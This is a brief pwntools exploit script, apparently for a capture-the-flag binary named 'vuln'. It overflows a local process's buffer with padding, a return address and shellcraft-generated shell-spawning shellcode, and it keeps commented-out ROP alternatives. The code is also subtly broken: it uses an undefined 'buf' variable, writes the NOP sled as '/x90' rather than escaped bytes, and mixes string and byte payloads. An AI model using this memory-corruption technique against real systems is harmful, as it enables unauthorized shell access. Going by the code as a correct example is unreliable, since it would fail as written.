from pwn import*

context.terminal = ['tmux','split','-h']

p = process('./vuln')
gdb.attach(proc.pidof(p)[0])


#buf = 0x8048941
bss = 0x080db3c0

pop_ebx = 0x080481c9
vuln = 0x080488a5

shellcode = asm(shellcraft.sh())

payload = "/x90"* 532
payload += buf
payload += shellcode
#payload += p32(pop_ebx)
#payload += "AAAA"
#payload += p32(bss)

#payload += shellcode




p.sendline(payload)
#p.sendline(shellcode)
p.interactive()



